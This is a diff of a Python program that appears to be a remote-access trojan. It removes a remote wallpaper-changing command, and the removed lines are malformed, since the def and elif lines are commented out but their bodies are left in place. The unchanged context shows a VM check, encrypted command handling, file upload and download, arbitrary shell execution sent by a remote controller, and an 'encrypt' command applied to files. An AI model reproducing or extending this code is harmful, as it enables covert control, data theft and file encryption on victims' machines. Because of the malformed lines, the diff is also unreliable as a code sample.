@@ -206,16 +206,6 @@ def check_vm():
     except:
         return False
 
-# ------------------ Wallpaper Control ------------------
-
-# def change_wallpaper(image_path: str) -> bytes:
-    if not os.path.exists(image_path):
-        return encrypt(b"Image not found")
-    
-    SPI_SETDESKWALLPAPER = 20
-    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
-    return encrypt(b"Wallpaper changed")
-
 # ------------------ Operating System Prediction ------------------
 
 def predict_operating_system():
@@ -610,7 +600,6 @@ class ClientHandler:
                     file_name = decrypt(self.recv()).decode()
                     self.upload(file_name)
 
-
                 elif cmd.startswith("upload "):
                     file_name = decrypt(self.recv()).decode()
                     self.download(file_name)
@@ -619,29 +608,6 @@ class ClientHandler:
                     command = cmd[6:]
                     result = subprocess.run(command, shell=True, capture_output=True, text=True)
                     self.send_data(result.stdout.encode())
-
-                # elif cmd.startswith("wall "):
-                    if os_name=="Windows":
-                        filename = cmd.split(" ", 1)[1]
-                        result = change_wallpaper(os.path.join(os.getcwd(), filename))
-                        self.send(encrypt(b"1"))
-                        self.send(result)
-                    else:
-                        try:
-                            filename = cmd.split(" ", 1)[1]
-                            filepath = os.path.join(os.getcwd(), filename)
-                            command = f"gsettings set org.gnome.desktop.background picture-uri file://{filepath}"
-                            result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                            if result.returncode == 0:
-                                self.send(encrypt(b"1"))
-                                self.send(encrypt(b"Wallpaper changed successfully"))
-                            else:
-                                self.send(encrypt(b"1")) 
-                                self.send(encrypt(b"Failed to change wallpaper - command failed"))
-                        except Exception as e:
-                            self.send(encrypt(b"1"))
-                            self.send(encrypt(f"Failed to change wallpaper: {str(e)}".encode()))
-                    self.recv()
                 
                 elif cmd.startswith("encrypt "):
                     file_name = decrypt(self.recv()).decode()
